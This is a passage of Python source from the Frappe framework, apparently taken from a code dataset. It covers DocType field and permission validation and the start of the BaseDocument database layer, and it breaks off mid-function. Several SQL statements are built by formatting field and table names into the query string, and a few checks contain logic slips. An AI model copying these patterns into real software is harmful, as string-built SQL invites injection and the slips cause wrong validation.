	9. Precision is set in numeric fields and is between 1 & 6.
	10. Fold is not at the end (if set).
	11. `search_fields` are valid.
	12. `title_field` and title field pattern are valid.
	13. `unique` check is only valid for Data, Link and Read Only fieldtypes.
	14. `unique` cannot be checked if there exist non-unique values.

	:param meta: `frappe.model.meta.Meta` object to check.""""""
	def check_illegal_characters(fieldname):
		validate_column_name(fieldname)

	def check_unique_fieldname(docname, fieldname):
		duplicates = list(filter(None, map(lambda df: df.fieldname==fieldname and str(df.idx) or None, fields)))
		if len(duplicates) > 1:
			frappe.throw(_(""{0}: Fieldname {1} appears multiple times in rows {2}"").format(docname, fieldname, "", "".join(duplicates)), UniqueFieldnameError)

	def check_fieldname_length(fieldname):
		validate_column_length(fieldname)

	def check_illegal_mandatory(docname, d):
		if (d.fieldtype in no_value_fields) and d.fieldtype!=""Table"" and d.reqd:
			frappe.throw(_(""{0}: Field {1} of type {2} cannot be mandatory"").format(docname, d.label, d.fieldtype), IllegalMandatoryError)

	def check_link_table_options(docname, d):
		if d.fieldtype in (""Link"", ""Table""):
			if not d.options:
				frappe.throw(_(""{0}: Options required for Link or Table type field {1} in row {2}"").format(docname, d.label, d.idx), DoctypeLinkError)
			if d.options==""[Select]"" or d.options==d.parent:
				return
			if d.options != d.parent:
				options = frappe.db.get_value(""DocType"", d.options, ""name"")
				if not options:
					frappe.throw(_(""{0}: Options must be a valid DocType for field {1} in row {2}"").format(docname, d.label, d.idx), WrongOptionsDoctypeLinkError)
				elif not (options == d.options):
					frappe.throw(_(""{0}: Options {1} must be the same as doctype name {2} for the field {3}"", DoctypeLinkError)
						.format(docname, d.options, options, d.label))
				else:
					# fix case
					d.options = options

	def check_hidden_and_mandatory(docname, d):
		if d.hidden and d.reqd and not d.default:
			frappe.throw(_(""{0}: Field {1} in row {2} cannot be hidden and mandatory without default"").format(docname, d.label, d.idx), HiddenAndMandatoryWithoutDefaultError)

	def check_width(d):
		if d.fieldtype == ""Currency"" and cint(d.width) < 100:
			frappe.throw(_(""Max width for type Currency is 100px in row {0}"").format(d.idx))

	def check_in_list_view(d):
		if d.in_list_view and (d.fieldtype in not_allowed_in_list_view):
			frappe.throw(_(""'In List View' not allowed for type {0} in row {1}"").format(d.fieldtype, d.idx))

	def check_in_global_search(d):
		if d.in_global_search and d.fieldtype in no_value_fields:
			frappe.throw(_(""'In Global Search' not allowed for type {0} in row {1}"")
				.format(d.fieldtype, d.idx))

	def check_dynamic_link_options(d):
		if d.fieldtype==""Dynamic Link"":
			doctype_pointer = list(filter(lambda df: df.fieldname==d.options, fields))
			if not doctype_pointer or (doctype_pointer[0].fieldtype not in (""Link"", ""Select"")) \
				or (doctype_pointer[0].fieldtype==""Link"" and doctype_pointer[0].options!=""DocType""):
				frappe.throw(_(""Options 'Dynamic Link' type of field must point to another Link Field with options as 'DocType'""))

	def check_illegal_default(d):
		if d.fieldtype == ""Check"" and d.default and d.default not in ('0', '1'):
			frappe.throw(_(""Default for 'Check' type of field must be either '0' or '1'""))
		if d.fieldtype == ""Select"" and d.default and (d.default not in d.options.split(""\n"")):
			frappe.throw(_(""Default for {0} must be an option"").format(d.fieldname))

	def check_precision(d):
		if d.fieldtype in (""Currency"", ""Float"", ""Percent"") and d.precision is not None and not (1 <= cint(d.precision) <= 6):
			frappe.throw(_(""Precision should be between 1 and 6""))

	def check_unique_and_text(docname, d):
		if meta.issingle:
			d.unique = 0
			d.search_index = 0

		if getattr(d, ""unique"", False):
			if d.fieldtype not in (""Data"", ""Link"", ""Read Only""):
				frappe.throw(_(""{0}: Fieldtype {1} for {2} cannot be unique"").format(docname, d.fieldtype, d.label), NonUniqueError)

			if not d.get(""__islocal""):
				try:
					has_non_unique_values = frappe.db.sql(""""""select `{fieldname}`, count(*)
						from `tab{doctype}` where ifnull({fieldname}, '') != ''
						group by `{fieldname}` having count(*) > 1 limit 1"""""".format(
						doctype=d.parent, fieldname=d.fieldname))

				except pymysql.InternalError as e:
					if e.args and e.args[0] == ER.BAD_FIELD_ERROR:
						# ignore if missing column, else raise
						# this happens in case of Custom Field
						pass
					else:
						raise

				else:
					# else of try block
					if has_non_unique_values and has_non_unique_values[0][0]:
						frappe.throw(_(""{0}: Field '{1}' cannot be set as Unique as it has non-unique values"").format(docname, d.label), NonUniqueError)

		if d.search_index and d.fieldtype in (""Text"", ""Long Text"", ""Small Text"", ""Code"", ""Text Editor""):
			frappe.throw(_(""{0}:Fieldtype {1} for {2} cannot be indexed"").format(docname, d.fieldtype, d.label), CannotIndexedError)

	def check_fold(fields):
		fold_exists = False
		for i, f in enumerate(fields):
			if f.fieldtype==""Fold"":
				if fold_exists:
					frappe.throw(_(""There can be only one Fold in a form""))
				fold_exists = True
				if i < len(fields)-1:
					nxt = fields[i+1]
					if nxt.fieldtype != ""Section Break"":
						frappe.throw(_(""Fold must come before a Section Break""))
				else:
					frappe.throw(_(""Fold can not be at the end of the form""))

	def check_search_fields(meta, fields):
		""""""Throw exception if `search_fields` don't contain valid fields.""""""
		if not meta.search_fields:
			return

		# No value fields should not be included in search field
		search_fields = [field.strip() for field in (meta.search_fields or """").split("","")]
		fieldtype_mapper = { field.fieldname: field.fieldtype \
			for field in filter(lambda field: field.fieldname in search_fields, fields) }

		for fieldname in search_fields:
			fieldname = fieldname.strip()
			if (fieldtype_mapper.get(fieldname) in no_value_fields) or \
				(fieldname not in fieldname_list):
				frappe.throw(_(""Search field {0} is not valid"").format(fieldname))

	def check_title_field(meta):
		""""""Throw exception if `title_field` isn't a valid fieldname.""""""
		if not meta.get(""title_field""):
			return

		if meta.title_field not in fieldname_list:
			frappe.throw(_(""Title field must be a valid fieldname""), InvalidFieldNameError)

		def _validate_title_field_pattern(pattern):
			if not pattern:
				return

			for fieldname in re.findall(""{(.*?)}"", pattern, re.UNICODE):
				if fieldname.startswith(""{""):
					# edge case when double curlies are used for escape
					continue

				if fieldname not in fieldname_list:
					frappe.throw(_(""{{{0}}} is not a valid fieldname pattern. It should be {{field_name}}."").format(fieldname),
						InvalidFieldNameError)

		df = meta.get(""fields"", filters={""fieldname"": meta.title_field})[0]
		if df:
			_validate_title_field_pattern(df.options)
			_validate_title_field_pattern(df.default)

	def check_image_field(meta):
		'''check image_field exists and is of type ""Attach Image""'''
		if not meta.image_field:
			return

		df = meta.get(""fields"", {""fieldname"": meta.image_field})
		if not df:
			frappe.throw(_(""Image field must be a valid fieldname""), InvalidFieldNameError)
		if df[0].fieldtype != 'Attach Image':
			frappe.throw(_(""Image field must be of type Attach Image""), InvalidFieldNameError)

	def check_is_published_field(meta):
		if not meta.is_published_field:
			return

		if meta.is_published_field not in fieldname_list:
			frappe.throw(_(""Is Published Field must be a valid fieldname""), InvalidFieldNameError)

	def check_timeline_field(meta):
		if not meta.timeline_field:
			return

		if meta.timeline_field not in fieldname_list:
			frappe.throw(_(""Timeline field must be a valid fieldname""), InvalidFieldNameError)

		df = meta.get(""fields"", {""fieldname"": meta.timeline_field})[0]
		if df.fieldtype not in (""Link"", ""Dynamic Link""):
			frappe.throw(_(""Timeline field must be a Link or Dynamic Link""), InvalidFieldNameError)

	def check_sort_field(meta):
		'''Validate that sort_field(s) is a valid field'''
		if meta.sort_field:
			sort_fields = [meta.sort_field]
			if ','  in meta.sort_field:
				sort_fields = [d.split()[0] for d in meta.sort_field.split(',')]

			for fieldname in sort_fields:
				if not fieldname in fieldname_list + list(default_fields):
					frappe.throw(_(""Sort field {0} must be a valid fieldname"").format(fieldname),
						InvalidFieldNameError)

	def check_illegal_depends_on_conditions(docfield):
		''' assignment operation should not be allowed in the depends on condition.'''
		depends_on_fields = [""depends_on"", ""collapsible_depends_on""]
		for field in depends_on_fields:
			depends_on = docfield.get(field, None)
			if depends_on and (""="" in depends_on) and \
				re.match(""""""[\w\.:_]+\s*={1}\s*[\w\.@'""]+"""""", depends_on):
				frappe.throw(_(""Invalid {0} condition"").format(frappe.unscrub(field)), frappe.ValidationError)

	def scrub_options_in_select(field):
		""""""Strip options for whitespaces""""""

		if field.fieldtype == ""Select"" and field.options is not None:
			options_list = []
			for i, option in enumerate(field.options.split(""\n"")):
				_option = option.strip()
				if i==0 or _option:
					options_list.append(_option)
			field.options = '\n'.join(options_list)

	def scrub_fetch_from(field):
		if hasattr(field, 'fetch_from') and getattr(field, 'fetch_from'):
			field.fetch_from = field.fetch_from.strip('\n').strip()

	fields = meta.get(""fields"")
	fieldname_list = [d.fieldname for d in fields]

	not_allowed_in_list_view = list(copy.copy(no_value_fields))
	not_allowed_in_list_view.append(""Attach Image"")
	if meta.istable:
		not_allowed_in_list_view.remove('Button')

	for d in fields:
		if not d.permlevel: d.permlevel = 0
		if d.fieldtype != ""Table"": d.allow_bulk_edit = 0
		if not d.fieldname:
			d.fieldname = d.fieldname.lower()

		check_illegal_characters(d.fieldname)
		check_unique_fieldname(meta.get(""name""), d.fieldname)
		check_fieldname_length(d.fieldname)
		check_illegal_mandatory(meta.get(""name""), d)
		check_link_table_options(meta.get(""name""), d)
		check_dynamic_link_options(d)
		check_hidden_and_mandatory(meta.get(""name""), d)
		check_in_list_view(d)
		check_in_global_search(d)
		check_illegal_default(d)
		check_unique_and_text(meta.get(""name""), d)
		check_illegal_depends_on_conditions(d)
		scrub_options_in_select(d)
		scrub_fetch_from(d)

	check_fold(fields)
	check_search_fields(meta, fields)
	check_title_field(meta)
	check_timeline_field(meta)
	check_is_published_field(meta)
	check_sort_field(meta)
	check_image_field(meta)

def validate_permissions_for_doctype(doctype, for_remove=False):
	""""""Validates if permissions are set correctly.""""""
	doctype = frappe.get_doc(""DocType"", doctype)
	validate_permissions(doctype, for_remove)

	# save permissions
	for perm in doctype.get(""permissions""):
		perm.db_update()

	clear_permissions_cache(doctype.name)

def clear_permissions_cache(doctype):
	frappe.clear_cache(doctype=doctype)
	delete_notification_count_for(doctype)
	for user in frappe.db.sql_list(""""""select
			distinct `tabHas Role`.parent
		from
			`tabHas Role`,
		tabDocPerm
			where tabDocPerm.parent = %s
			and tabDocPerm.role = `tabHas Role`.role"""""", doctype):
		frappe.clear_cache(user=user)

def validate_permissions(doctype, for_remove=False):
	permissions = doctype.get(""permissions"")
	if not permissions:
		frappe.msgprint(_('No Permissions Specified'), alert=True, indicator='orange')
	issingle = issubmittable = isimportable = False
	if doctype:
		issingle = cint(doctype.issingle)
		issubmittable = cint(doctype.is_submittable)
		isimportable = cint(doctype.allow_import)

	def get_txt(d):
		return _(""For {0} at level {1} in {2} in row {3}"").format(d.role, d.permlevel, d.parent, d.idx)

	def check_atleast_one_set(d):
		if not d.read and not d.write and not d.submit and not d.cancel and not d.create:
			frappe.throw(_(""{0}: No basic permissions set"").format(get_txt(d)))

	def check_double(d):
		has_similar = False
		similar_because_of = """"
		for p in permissions:
			if p.role==d.role and p.permlevel==d.permlevel and p!=d:
				if p.if_owner==d.if_owner:
					similar_because_of = _(""If Owner"")
					has_similar = True
					break

		if has_similar:
			frappe.throw(_(""{0}: Only one rule allowed with the same Role, Level and {1}"")\
				.format(get_txt(d),	similar_because_of))

	def check_level_zero_is_set(d):
		if cint(d.permlevel) > 0 and d.role != 'All':
			has_zero_perm = False
			for p in permissions:
				if p.role==d.role and (p.permlevel or 0)==0 and p!=d:
					has_zero_perm = True
					break

			if not has_zero_perm:
				frappe.throw(_(""{0}: Permission at level 0 must be set before higher levels are set"").format(get_txt(d)))

			for invalid in (""create"", ""submit"", ""cancel"", ""amend""):
				if d.get(invalid): d.set(invalid, 0)

	def check_permission_dependency(d):
		if d.cancel and not d.submit:
			frappe.throw(_(""{0}: Cannot set Cancel without Submit"").format(get_txt(d)))

		if (d.submit or d.cancel or d.amend) and not d.write:
			frappe.throw(_(""{0}: Cannot set Submit, Cancel, Amend without Write"").format(get_txt(d)))
		if d.amend and not d.write:
			frappe.throw(_(""{0}: Cannot set Amend without Cancel"").format(get_txt(d)))
		if d.get(""import"") and not d.create:
			frappe.throw(_(""{0}: Cannot set Import without Create"").format(get_txt(d)))

	def remove_rights_for_single(d):
		if not issingle:
			return

		if d.report:
			frappe.msgprint(_(""Report cannot be set for Single types""))
			d.report = 0
			d.set(""import"", 0)
			d.set(""export"", 0)

		for ptype, label in [[""set_user_permissions"", _(""Set User Permissions"")]]:
			if d.get(ptype):
				d.set(ptype, 0)
				frappe.msgprint(_(""{0} cannot be set for Single types"").format(label))

	def check_if_submittable(d):
		if d.submit and not issubmittable:
			frappe.throw(_(""{0}: Cannot set Assign Submit if not Submittable"").format(get_txt(d)))
		elif d.amend and not issubmittable:
			frappe.throw(_(""{0}: Cannot set Assign Amend if not Submittable"").format(get_txt(d)))

	def check_if_importable(d):
		if d.get(""import"") and not isimportable:
			frappe.throw(_(""{0}: Cannot set import as {1} is not importable"").format(get_txt(d), doctype))

	for d in permissions:
		if not d.permlevel:
			d.permlevel=0
		check_atleast_one_set(d)
		if not for_remove:
			check_double(d)
			check_permission_dependency(d)
			check_if_submittable(d)
			check_if_importable(d)
		check_level_zero_is_set(d)
		remove_rights_for_single(d)

def make_module_and_roles(doc, perm_fieldname=""permissions""):
	""""""Make `Module Def` and `Role` records if already not made. Called while installing.""""""
	try:
		if hasattr(doc,'restrict_to_domain') and doc.restrict_to_domain and \
			not frappe.db.exists('Domain', doc.restrict_to_domain):
			frappe.get_doc(dict(doctype='Domain', domain=doc.restrict_to_domain)).insert()

		if not frappe.db.exists(""Module Def"", doc.module):
			m = frappe.get_doc({""doctype"": ""Module Def"", ""module_name"": doc.module})
			m.app_name = frappe.local.module_app[frappe.scrub(doc.module)]
			m.flags.ignore_mandatory = m.flags.ignore_permissions = True
			m.insert()

		default_roles = [""Administrator"", ""Guest"", ""All""]
		roles = [p.role for p in doc.get(""permissions"") or []] + default_roles

		for role in list(set(roles)):
			if not frappe.db.exists(""Role"", role):
				r = frappe.get_doc(dict(doctype= ""Role"", role_name=role, desk_access=1))
				r.flags.ignore_mandatory = r.flags.ignore_permissions = True
				r.insert()
	except frappe.DoesNotExistError as e:
		pass
	except frappe.SQLError as e:
		if e.args[0]==1146:
			pass
		else:
			raise

def init_list(doctype):
	""""""Make boilerplate list views.""""""
	doc = frappe.get_meta(doctype)
	make_boilerplate(""controller_list.js"", doc)
	make_boilerplate(""controller_list.html"", doc)

def check_if_fieldname_conflicts_with_methods(doctype, fieldname):
	doc = frappe.get_doc({""doctype"": doctype})
	method_list = [method for method in dir(doc) if isinstance(method, str) and callable(getattr(doc, method))]

	if fieldname in method_list:
		frappe.throw(_(""Fieldname {0} conflicting with meta object"").format(fieldname))

def clear_linked_doctype_cache():
	frappe.cache().delete_value('linked_doctypes_without_ignore_user_permissions_enabled')
/n/n/nfrappe/model/base_document.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals
from six import iteritems, string_types
import datetime
import frappe, sys
from frappe import _
from frappe.utils import (cint, flt, now, cstr, strip_html,
	sanitize_html, sanitize_email, cast_fieldtype)
from frappe.model import default_fields
from frappe.model.naming import set_new_name
from frappe.model.utils.link_count import notify_link_count
from frappe.modules import load_doctype_module
from frappe.model import display_fieldtypes
from frappe.model.db_schema import type_map, varchar_len
from frappe.utils.password import get_decrypted_password, set_encrypted_password

_classes = {}

def get_controller(doctype):
	""""""Returns the **class** object of the given DocType.
	For `custom` type, returns `frappe.model.document.Document`.

	:param doctype: DocType name as string.""""""
	from frappe.model.document import Document
	global _classes

	if not doctype in _classes:
		module_name, custom = frappe.db.get_value(""DocType"", doctype, (""module"", ""custom""), cache=True) \
			or [""Core"", False]

		if custom:
			_class = Document
		else:
			module = load_doctype_module(doctype, module_name)
			classname = doctype.replace("" "", """").replace(""-"", """")
			if hasattr(module, classname):
				_class = getattr(module, classname)
				if issubclass(_class, BaseDocument):
					_class = getattr(module, classname)
				else:
					raise ImportError(doctype)
			else:
				raise ImportError(doctype)
		_classes[doctype] = _class

	return _classes[doctype]

class BaseDocument(object):
	ignore_in_getter = (""doctype"", ""_meta"", ""meta"", ""_table_fields"", ""_valid_columns"")

	def __init__(self, d):
		self.update(d)
		self.dont_update_if_missing = []

		if hasattr(self, ""__setup__""):
			self.__setup__()

	@property
	def meta(self):
		if not hasattr(self, ""_meta""):
			self._meta = frappe.get_meta(self.doctype)

		return self._meta

	def update(self, d):
		if ""doctype"" in d:
			self.set(""doctype"", d.get(""doctype""))

		# first set default field values of base document
		for key in default_fields:
			if key in d:
				self.set(key, d.get(key))

		for key, value in iteritems(d):
			self.set(key, value)

		return self

	def update_if_missing(self, d):
		if isinstance(d, BaseDocument):
			d = d.get_valid_dict()

		if ""doctype"" in d:
			self.set(""doctype"", d.get(""doctype""))
		for key, value in iteritems(d):
			# dont_update_if_missing is a list of fieldnames, for which, you don't want to set default value
			if (self.get(key) is None) and (value is not None) and (key not in self.dont_update_if_missing):
				self.set(key, value)

	def get_db_value(self, key):
		return frappe.db.get_value(self.doctype, self.name, key)

	def get(self, key=None, filters=None, limit=None, default=None):
		if key:
			if isinstance(key, dict):
				return _filter(self.get_all_children(), key, limit=limit)
			if filters:
				if isinstance(filters, dict):
					value = _filter(self.__dict__.get(key, []), filters, limit=limit)
				else:
					default = filters
					filters = None
					value = self.__dict__.get(key, default)
			else:
				value = self.__dict__.get(key, default)

			if value is None and key not in self.ignore_in_getter \
				and key in (d.fieldname for d in self.meta.get_table_fields()):
				self.set(key, [])
				value = self.__dict__.get(key)

			return value
		else:
			return self.__dict__

	def getone(self, key, filters=None):
		return self.get(key, filters=filters, limit=1)[0]

	def set(self, key, value, as_value=False):
		if isinstance(value, list) and not as_value:
			self.__dict__[key] = []
			self.extend(key, value)
		else:
			self.__dict__[key] = value

	def delete_key(self, key):
		if key in self.__dict__:
			del self.__dict__[key]

	def append(self, key, value=None):
		if value==None:
			value={}
		if isinstance(value, (dict, BaseDocument)):
			if not self.__dict__.get(key):
				self.__dict__[key] = []
			value = self._init_child(value, key)
			self.__dict__[key].append(value)

			# reference parent document
			value.parent_doc = self

			return value
		else:

			# metaclasses may have arbitrary lists
			# which we can ignore
			if (getattr(self, '_metaclass', None)
				or self.__class__.__name__ in ('Meta', 'FormMeta', 'DocField')):
				return value

			raise ValueError(
				'Document for field ""{0}"" attached to child table of ""{1}"" must be a dict or BaseDocument, not {2} ({3})'.format(key,
					self.name, str(type(value))[1:-1], value)
			)

	def extend(self, key, value):
		if isinstance(value, list):
			for v in value:
				self.append(key, v)
		else:
			raise ValueError

	def remove(self, doc):
		self.get(doc.parentfield).remove(doc)

	def _init_child(self, value, key):
		if not self.doctype:
			return value
		if not isinstance(value, BaseDocument):
			if ""doctype"" not in value:
				value[""doctype""] = self.get_table_field_doctype(key)
				if not value[""doctype""]:
					raise AttributeError(key)
			value = get_controller(value[""doctype""])(value)
			value.init_valid_columns()

		value.parent = self.name
		value.parenttype = self.doctype
		value.parentfield = key

		if value.docstatus is None:
			value.docstatus = 0

		if not getattr(value, ""idx"", None):
			value.idx = len(self.get(key) or []) + 1

		if not getattr(value, ""name"", None):
			value.__dict__['__islocal'] = 1

		return value

	def get_valid_dict(self, sanitize=True, convert_dates_to_str=False):
		d = frappe._dict()
		for fieldname in self.meta.get_valid_columns():
			d[fieldname] = self.get(fieldname)

			# if no need for sanitization and value is None, continue
			if not sanitize and d[fieldname] is None:
				continue

			df = self.meta.get_field(fieldname)
			if df:
				if df.fieldtype==""Check"":
					if d[fieldname]==None:
						d[fieldname] = 0

					elif (not isinstance(d[fieldname], int) or d[fieldname] > 1):
						d[fieldname] = 1 if cint(d[fieldname]) else 0

				elif df.fieldtype==""Int"" and not isinstance(d[fieldname], int):
					d[fieldname] = cint(d[fieldname])

				elif df.fieldtype in (""Currency"", ""Float"", ""Percent"") and not isinstance(d[fieldname], float):
					d[fieldname] = flt(d[fieldname])

				elif df.fieldtype in (""Datetime"", ""Date"", ""Time"") and d[fieldname]=="""":
					d[fieldname] = None

				elif df.get(""unique"") and cstr(d[fieldname]).strip()=="""":
					# unique empty field should be set to None
					d[fieldname] = None

				if isinstance(d[fieldname], list) and df.fieldtype != 'Table':
					frappe.throw(_('Value for {0} cannot be a list').format(_(df.label)))

				if convert_dates_to_str and isinstance(d[fieldname], (datetime.datetime, datetime.time, datetime.timedelta)):
					d[fieldname] = str(d[fieldname])

		return d

	def init_valid_columns(self):
		for key in default_fields:
			if key not in self.__dict__:
				self.__dict__[key] = None

			if key in (""idx"", ""docstatus"") and self.__dict__[key] is None:
				self.__dict__[key] = 0

		for key in self.get_valid_columns():
			if key not in self.__dict__:
				self.__dict__[key] = None

	def get_valid_columns(self):
		if self.doctype not in frappe.local.valid_columns:
			if self.doctype in (""DocField"", ""DocPerm"") and self.parent in (""DocType"", ""DocField"", ""DocPerm""):
				from frappe.model.meta import get_table_columns
				valid = get_table_columns(self.doctype)
			else:
				valid = self.meta.get_valid_columns()

			frappe.local.valid_columns[self.doctype] = valid

		return frappe.local.valid_columns[self.doctype]

	def is_new(self):
		return self.get(""__islocal"")

	def as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False):
		doc = self.get_valid_dict(convert_dates_to_str=convert_dates_to_str)
		doc[""doctype""] = self.doctype
		for df in self.meta.get_table_fields():
			children = self.get(df.fieldname) or []
			doc[df.fieldname] = [d.as_dict(no_nulls=no_nulls) for d in children]

		if no_nulls:
			for k in list(doc):
				if doc[k] is None:
					del doc[k]

		if no_default_fields:
			for k in list(doc):
				if k in default_fields:
					del doc[k]

		for key in (""_user_tags"", ""__islocal"", ""__onload"", ""_liked_by"", ""__run_link_triggers""):
			if self.get(key):
				doc[key] = self.get(key)

		return doc

	def as_json(self):
		return frappe.as_json(self.as_dict())

	def get_table_field_doctype(self, fieldname):
		return self.meta.get_field(fieldname).options

	def get_parentfield_of_doctype(self, doctype):
		fieldname = [df.fieldname for df in self.meta.get_table_fields() if df.options==doctype]
		return fieldname[0] if fieldname else None

	def db_insert(self):
		""""""INSERT the document (with valid columns) in the database.""""""
		if not self.name:
			# name will be set by document class in most cases
			set_new_name(self)

		if not self.creation:
			self.creation = self.modified = now()
			self.created_by = self.modifield_by = frappe.session.user

		d = self.get_valid_dict(convert_dates_to_str=True)

		columns = list(d)
		try:
			frappe.db.sql(""""""insert into `tab{doctype}`
				({columns}) values ({values})"""""".format(
					doctype = self.doctype,
					columns = "", "".join([""`""+c+""`"" for c in columns]),
					values = "", "".join([""%s""] * len(columns))
				), list(d.values()))
		except Exception as e:
			if e.args[0]==1062:
				if ""PRIMARY"" in cstr(e.args[1]):
					if self.meta.autoname==""hash"":
						# hash collision? try again
						self.name = None
						self.db_insert()
						return

					raise frappe.DuplicateEntryError(self.doctype, self.name, e)

				elif ""Duplicate"" in cstr(e.args[1]):
					# unique constraint
					self.show_unique_validation_message(e)
				else:
					raise
			else:
				raise
		self.set(""__islocal"", False)

	def db_update(self):
		if self.get(""__islocal"") or not self.name:
			self.db_insert()
			return

		d = self.get_valid_dict(convert_dates_to_str=True)

		# don't update name, as case might've been changed
		name = d['name']
		del d['name']

		columns = list(d)

		try:
			frappe.db.sql(""""""update `tab{doctype}`
				set {values} where name=%s"""""".format(
					doctype = self.doctype,
					values = "", "".join([""`""+c+""`=%s"" for c in columns])
				), list(d.values()) + [name])
		except Exception as e:
			if e.args[0]==1062 and ""Duplicate"" in cstr(e.args[1]):
				self.show_unique_validation_message(e)
			else:
				raise

	def show_unique_validation_message(self, e):
		type, value, traceback = sys.exc_info()
		fieldname, label = str(e).split(""'"")[-2], None

		# unique_first_fieldname_second_fieldname is the constraint name
		# created using frappe.db.add_unique
		if ""unique_"" in fieldname:
			fieldname = fieldname.split(""_"", 1)[1]

		df = self.meta.get_field(fieldname)
		if df:
			label = df.label

		frappe.msgprint(_(""{0} must be unique"".format(label or fieldname)))

		# this is used to preserve traceback
		raise frappe.UniqueValidationError(self.doctype, self.name, e)

	def update_modified(self):
		'''Update modified timestamp'''
		self.set(""modified"", now())
		frappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False)

	def _fix_numeric_types(self):
		for df in self.meta.get(""fields""):
			if df.fieldtype == ""Check"":
				self.set(df.fieldname, cint(self.get(df.fieldname)))

			elif self.get(df.fieldname) is not None:
				if df.fieldtype == ""Int"":
					self.set(df.fieldname, cint(self.get(df.fieldname)))

				elif df.fieldtype in (""Float"", ""Currency"", ""Percent""):
					self.set(df.fieldname, flt(self.get(df.fieldname)))

		if self.docstatus is not None:
			self.docstatus = cint(self.docstatus)

	def _get_missing_mandatory_fields(self):
		""""""Get mandatory fields that do not have any values""""""
		def get_msg(df):
			if df.fieldtype == ""Table"":
				return ""{}: {}: {}"".format(_(""Error""), _(""Data missing in table""), _(df.label))

			elif self.parentfield:
				return ""{}: {} {} #{}: {}: {}"".format(_(""Error""), frappe.bold(_(self.doctype)),
					_(""Row""), self.idx, _(""Value missing for""), _(df.label))

			else:
				return _(""Error: Value missing for {0}: {1}"").format(_(df.parent), _(df.label))

		missing = []

		for df in self.meta.get(""fields"", {""reqd"": ('=', 1)}):
			if self.get(df.fieldname) in (None, []) or not strip_html(cstr(self.get(df.fieldname))).strip():
				missing.append((df.fieldname, get_msg(df)))

		# check for missing parent and parenttype
		if self.meta.istable:
			for fieldname in (""parent"", ""parenttype""):
				if not self.get(fieldname):
					missing.append((fieldname, get_msg(frappe._dict(label=fieldname))))

		return missing

	def get_invalid_links(self, is_submittable=False):
		'''Returns list of invalid links and also updates fetch values if not set'''
		def get_msg(df, docname):
			if self.parentfield:
				return ""{} #{}: {}: {}"".format(_(""Row""), self.idx, _(df.label), docname)
			else:
				return ""{}: {}"".format(_(df.label), docname)

		invalid_links = []
		cancelled_links = []

		for df in (self.meta.get_link_fields()
				+ self.meta.get(""fields"", {""fieldtype"": ('=', ""Dynamic Link"")})):
			docname = self.get(df.fieldname)

			if docname:
				if df.fieldtype==""Link"":
					doctype = df.options
					if not doctype:
						frappe.throw(_(""Options not set for link field {0}"").format(df.fieldname))
				else:
					doctype = self.get(df.options)
					if not doctype:
						frappe.throw(_(""{0} must be set first"").format(self.meta.get_label(df.options)))

				# MySQL is case insensitive. Preserve case of the original docname in the Link Field.

				# get a map of values ot fetch along with this link query
				# that are mapped as link_fieldname.source_fieldname in Options of
				# Readonly or Data or Text type fields

				fields_to_fetch = [
					_df for _df in self.meta.get_fields_to_fetch(df.fieldname)
					if
						not _df.get('fetch_if_empty')
						or (_df.get('fetch_if_empty') and not self.get(_df.fieldname))
				]

				if not fields_to_fetch:
					# cache a single value type
					values = frappe._dict(name=frappe.db.get_value(doctype, docname,
						'name', cache=True))
				else:
					values_to_fetch = ['name'] + [_df.fetch_from.split('.')[-1]
						for _df in fields_to_fetch]

					# don't cache if fetching other values too
					values = frappe.db.get_value(doctype, docname,
						values_to_fetch, as_dict=True)

				if frappe.get_meta(doctype).issingle:
					values.name = doctype

				if values:
					setattr(self, df.fieldname, values.name)

					for _df in fields_to_fetch:
						if self.is_new() or self.docstatus != 1 or _df.allow_on_submit:
							setattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]])

					notify_link_count(doctype, docname)

					if not values.name:
						invalid_links.append((df.fieldname, docname, get_msg(df, docname)))

					elif (df.fieldname != ""amended_from""
						and (is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable
						and cint(frappe.db.get_value(doctype, docname, ""docstatus""))==2):

						cancelled_links.append((df.fieldname, docname, get_msg(df, docname)))

		return invalid_links, cancelled_links

	def _validate_selects(self):
		if frappe.flags.in_import:
			return

		for df in self.meta.get_select_fields():
			if df.fieldname==""naming_series"" or not (self.get(df.fieldname) and df.options):
				continue

			options = (df.options or """").split(""\n"")

			# if only empty options
			if not filter(None, options):
				continue

			# strip and set
			self.set(df.fieldname, cstr(self.get(df.fieldname)).strip())
			value = self.get(df.fieldname)

			if value not in options and not (frappe.flags.in_test and value.startswith(""_T-"")):
				# show an elaborate message
				prefix = _(""Row #{0}:"").format(self.idx) if self.get(""parentfield"") else """"
				label = _(self.meta.get_label(df.fieldname))
				comma_options = '"", ""'.join(_(each) for each in options)

				frappe.throw(_('{0} {1} cannot be ""{2}"". It should be one of ""{3}""').format(prefix, label,
					value, comma_options))

	def _validate_constants(self):
		if frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants:
			return

		constants = [d.fieldname for d in self.meta.get(""fields"", {""set_only_once"": ('=',1)})]
		if constants:
			values = frappe.db.get_value(self.doctype, self.name, constants, as_dict=True)

		for fieldname in constants:
			df = self.meta.get_field(fieldname)

			# This conversion to string only when fieldtype is Date
			if df.fieldtype == 'Date' or df.fieldtype == 'Datetime':
				value = str(values.get(fieldname))

			else:
				value  = values.get(fieldname)

			if self.get(fieldname) != value:
				frappe.throw(_(""Value cannot be changed for {0}"").format(self.meta.get_label(fieldname)),
					frappe.CannotChangeConstantError)

	def _validate_length(self):
		if frappe.flags.in_install:
			return

		if self.meta.issingle:
			# single doctype value type is mediumtext
			return

		column_types_to_check_length = ('varchar', 'int', 'bigint')

		for fieldname, value in iteritems(self.get_valid_dict()):
			df = self.meta.get_field(fieldname)

			if not df or df.fieldtype == 'Check':
				# skip standard fields and Check fields
				continue

			column_type = type_map[df.fieldtype][0] or None
			default_column_max_length = type_map[df.fieldtype][1] or None

			if df and df.fieldtype in type_map and column_type in column_types_to_check_length:
				max_length = cint(df.get(""length"")) or cint(default_column_max_length)

				if len(cstr(value)) > max_length:
					if self.parentfield and self.idx:
						reference = _(""{0}, Row {1}"").format(_(self.doctype), self.idx)

					else:
						reference = ""{0} {1}"".format(_(self.doctype), self.name)

					frappe.throw(_(""{0}: '{1}' ({3}) will get truncated, as max characters allowed is {2}"")\
						.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big'))

	def _validate_update_after_submit(self):
